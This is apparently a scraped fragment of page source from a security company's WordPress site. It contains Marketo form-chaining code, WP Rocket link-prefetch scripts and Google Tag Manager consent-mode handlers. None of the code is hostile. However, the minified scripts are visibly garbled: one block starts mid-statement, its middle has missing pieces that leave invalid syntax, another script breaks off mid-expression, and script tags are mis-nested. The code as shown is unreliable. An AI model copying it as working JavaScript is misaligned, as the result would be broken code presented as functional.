    punch_globals.siteUrl = 'https' + '://' + 'www.securonix.com/';
    punch_globals.frameworkUrl = 'https' + '://' + 'www.securonix.com/wp-content/themes/punch/framework/';
    punch_globals.installedAt = 'https' + '://' + 'www.securonix.com/wp-content/themes/punch/';
    punch_globals.ajaxurl = 'https' + '://' + 'www.securonix.com/wp-admin/admin-ajax.php';
/* ]]> */ 
</script>
 
 <script>
    function getFormIds() {
        var x = document.forms.length;
        var formArrayids = [];
        if (x > 0) {
            for (var i = 0; i <= x; i++) {
                var formVar = document.forms[i];
                if (formVar && formVar.className.match(/\bmktoForm\b/)) {
                    formArrayids.push(formVar.getAttribute("data-formId"));
                }
            }
        }
        return formArrayids.filter((v, i, a) => a.indexOf(v) === i);
    }

    var mktoFormConfig = {
        podId: "//pages.securonix.com",
        munchkinId: "179-DJP-142",
        formIds: getFormIds()
    };

    /* ---- NO NEED TO TOUCH ANYTHING BELOW THIS LINE! ---- */

    function mktoFormChain(config) {

        /* util */
        var arrayify = getSelection.call.bind([].slice);

        /* const */
        var MKTOFORM_ID_ATTRNAME = "data-formId";

        /* chain, ensuring only one #mktoForm_nnn exists at a time */
        arrayify(config.formIds).forEach(function (formId) {
            var loadForm = MktoForms2.loadForm.bind(MktoForms2, config.podId, config.munchkinId, formId);
            formEls = arrayify(document.querySelectorAll("[" + MKTOFORM_ID_ATTRNAME + '="' + formId + '"]'));

            (function loadFormCb(formEls) {
                var formEl = formEls.shift();
                formEl.id = "mktoForm_" + formId;

                loadForm(function (form) {
                    // Sanity check to prevent further errors if a Form doesn't exist.
                    if (form == null) {
                        return;
                    }

                    form.onSuccess(function (values, followUpUrl) {
                        // Set cookie.
                        const post_id = form.getFormElem().data('postId');
                        let now = new Date();
                        now.setMonth(now.getMonth() + 1);
                        cookievalue = post_id;
                        document.cookie = "wp-wordpress-mktoForm_" + formId + "_" + post_id + "=" + cookievalue + "; expires=" + now.toUTCString() + ";path=/";

                        form.getFormElem().hide();
                        form.getFormElem().parents('.securonix-marketo-form').find('.confirmation-message').show();

                        const download_link = form.getFormElem().data('download-link');
                        if (download_link) {
                            window.open(download_link);
                            window.location.reload();
                        }

                        return false;
                    });
                    formEl.id = "";
                    if (formEls.length) {
                        loadFormCb(formEls);
                    }
                });
            })(formEls);

            MktoForms2.whenRendered(function (form) {
                // If this Form is inside a Flickity instance, then trigger a resize.
                try {
                    const flickity_parents = form.getFormElem().parents('.ep-flickity-slider');

                    if (flickity_parents.length > 0) {
                        Flickity.data(flickity_parents[0]).resize();
                    }
                } catch (e) {
                    if (! e instanceof ReferenceError) {
                        throw e;
                    }
                }
            });
        });
    }

    mktoFormChain(mktoFormConfig);
</script>
<script type="text/javascript" src="https://www.securonix.com/wp-content/plugins/devvn-image-hotspot/frontend/js/jquery.powertip.min.js?ver=1.2.0" id="powertip-js"></script>
<script data-minify="1" type="text/javascript" src="https://www.securonix.com/wp-content/cache/min/1/wp-content/plugins/devvn-image-hotspot/frontend/js/maps_points.js?ver=1734415880" id="maps-points-js"></script>

descriptor=props[i];descriptor.enumerable=descriptor.enumerable||!1,descriptor.configurable=!0,"value"in descriptor&&(descriptor.writable=!0),Object.defineProperty(target,descriptor.key,descriptor)}}return function(Constructor,protoProps,staticProps){return protoProps&&defineProperties(Constructor.prototype,protoProps),staticProps&&defineProperties(Constructor,staticProps),Constructor}}();function _classCallCheck(instance,Constructor){if(!(instance instanceof Constructor))throw new TypeError("Cannot call a class as a function")}var RocketBrowserCompatibilityChecker=function(){function RocketBrowserCompatibilityChecker(options){_classCallCheck(this,RocketBrowserCompatibilityChecker),this.passiveSupported=!1,this._checkPassiveOption(this),this.options=!!this.passiveSupported&&options}return passive(){return!(self.passiveSupported=!0)}};window.addEventListener("test",null,options),window.removeEventListener("test",null,options)}catch(err){self.passiveSupported=!1}}},{key:"initRequestIdleCallback",value:function(){!1 window&&(window.cancelIdleCallback=function(id){return clearTimeout(id)})}},{key:"isDataSaverModeOn",value:function(){return"connection"in navigator&&!0===navigator.connection.saveData}},{key:"supportsLinkPrefetch",value:function(){var elem=document.createElement("link");return </script>
<script type="text/javascript" id="rocket-preload-links-js-extra">
/* <![CDATA[ */
var RocketPreloadLinksConfig = {"excludeUris":"\/(?:.+\/)?feed(?:\/(?:.+\/?)?)?$|\/(?:.+\/)?embed\/|\/(index.php\/)?(.*)wp-json(\/.*|$)|\/refer\/|\/go\/|\/recommend\/|\/recommends\/","usesTrailingSlash":"1","imageExt":"jpg|jpeg|gif|png|tiff|bmp|webp|avif|pdf|doc|docx|xls|xlsx|php","fileExt":"jpg|jpeg|gif|png|tiff|bmp|webp|avif|pdf|doc|docx|xls|xlsx|php|html|htm","siteUrl":"https:\/\/www.securonix.com","onHoverDelay":"100","rateThrottle":"3"};

</script>
<script type="text/javascript" id="rocket-preload-links-js-after">
/* <![CDATA[ */
(function() {
"use strict";var r="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},e=function(){function i(e,t){for(var n=0;n<t.length;n++){var i=t[n];i.enumerable=i.enumerable||!1,i.configurable=!0,"value"in i&&(i.writable=!0),Object.defineProperty(e,i.key,i)}}return function(e,t,n){return t&&i(e.prototype,t),n&&i(e,n),e}}();function i(e,t){if(!(e instanceof t))throw new TypeError("Cannot call a class as a function")}var t=function(){function n(e,t){i(this,n),this.browser=e,this.config=t,this.options=this.browser.options,this.prefetched=new Set,this.eventTime=null,this.threshold=1111,this.numOnHover=0}return e(n,[{key:"init",value:function(){!this.browser.supportsLinkPrefetch()||this.browser.isDataSaverModeOn()||this.browser.isSlowConnection()||(this.regex={excludeUris:RegExp(this.config.excludeUris,"i"),images:RegExp(".("+this.config.imageExt+")$","i"),fileExt:RegExp(".("+this.config.fileExt+")$","i")},this._initListeners(this))}},{key:"_initListeners",value:function(e){-1<this.config.onHoverDelay&&document.addEventListener("mouseover",e.listener.bind(e),e.listenerOptions),document.addEventListener("mousedown",e.listener.bind(e),e.listenerOptions),document.addEventListener("touchstart",e.listener.bind(e),e.listenerOptions)}},{key:"listener",value:function(e){var t=e.target.closest("a"),n=this._prepareUrl(t);if(null!==n)switch(e.type){case"mousedown":case"touchstart":this._addPrefetchLink(n);break;case"mouseover":this._earlyPrefetch(t,n,"mouseout")}}},{key:"_earlyPrefetch",value:function(t,e,n){var i=this,r=setTimeout(function(){if(r=null,0===i.numOnHover)setTimeout(function(){return i.numOnHover=0},1e3);else if(i.numOnHover>i.config.rateThrottle)return;i.numOnHover++,i._addPrefetchLink(e)},this.config.onHoverDelay);t.addEventListener(n,function e(){t.removeEventListener(n,e,{passive:!0}),null!==r&&(clearTimeout(r),r=null)},{passive:!0})}},{key:"_addPrefetchLink",value:function(i){return this.prefetched.add(i.href),new Promise(function(e,t){var n=document.createElement("link");n.rel="prefetch",n.href=i.href,n.onload=e,n.onerror=t,document.head.appendChild(n)}).catch(function(){})}},{key:"_prepareUrl",value:function(e){if(null===e||"object"!==(void 0===e?"undefined":r(e))||!1 in e||-1===["http:","https:"].indexOf(e.protocol))return null;var t=e.href.substring(0,this.config.siteUrl.length),n=this._getPathname(e.href,t),i={original:e.href,protocol:e.protocol,origin:t,pathname:n,href:t+n};return this._isLinkOk(i)?i:null}},{key:"_getPathname",value:function(e,t){var n=t?e.substring(this.config.siteUrl.length):e;return n.startsWith("/")||(n="/"+n),this._shouldAddTrailingSlash(n)?n+"/":n}},{key:"_shouldAddTrailingSlash",value:function(e){return this.config.usesTrailingSlash&&!e.endsWith("/")&&!this.regex.fileExt.test(e)}},{key:"_isLinkOk",value:function(e){return null!==e&&"object"===(void 0===e?"undefined":r(e))&&(!this.prefetched.has(e.href)&&e.origin===this.config.siteUrl&&-1===e.href.indexOf("?")&&-1===e.href.indexOf("#")&&!this.regex.excludeUris.test(e.href)&&!this.regex.images.test(e.href))}}],[{key:"run",value:function(){"undefined"!=typeof </script>

<script type="text/javascript" id="gt_widget_script_12865844-js-before">
/* <![CDATA[ */

<!-- Statistics script Complianz GDPR/CCPA -->
						<script data-category="functional">
							(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
		new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
	j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
	'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
})(window,document,'script','dataLayer','GTM-N56FZ8X');

const revokeListeners = [];
window.addRevokeListener = (callback) => {
	revokeListeners.push(callback);
};
document.addEventListener("cmplz_revoke", function (e) {
	cmplz_set_cookie('cmplz_consent_mode', 'revoked', false );
	revokeListeners.forEach((callback) => {
		callback();
	});
});

const consentListeners = [];
/**
 * Called from GTM template to set callback to be executed when user consent is provided.
 * @param callback
 */
window.addConsentUpdateListener = (callback) => {
	consentListeners.push(callback);
};
document.addEventListener("cmplz_fire_categories", function (e) {
	var consentedCategories = e.detail.categories;
	const consent = {
		'security_storage': "granted",
		'functionality_storage': "granted",
		'personalization_storage':  cmplz_in_array( 'preferences', consentedCategories ) ? 'granted' : 'denied',
		'analytics_storage':  cmplz_in_array( 'statistics', consentedCategories ) ? 'granted' : 'denied',
		'ad_storage': cmplz_in_array( 'marketing', consentedCategories ) ? 'granted' : 'denied',
		'ad_user_data': cmplz_in_array( 'marketing', consentedCategories ) ? 'granted' : 'denied',
		'ad_personalization': cmplz_in_array( 'marketing', consentedCategories ) ? 'granted' : 'denied',
	};

	//don't use automatic prefixing, as the TM template needs to be sure it's cmplz_.
	let consented = [];
	for (const [key, value] of Object.entries(consent)) {
		if (value === 'granted') {
			consented.push(key);
		}
	}
	cmplz_set_cookie('cmplz_consent_mode', consented.join(','), false );
	consentListeners.forEach((callback) => {
		callback(consent);
	});
});
						</script><!-- Script Center statistics script Complianz GDPR/CCPA -->
				<script  type="text/plain"
											 data-category="statistics">

				</script>
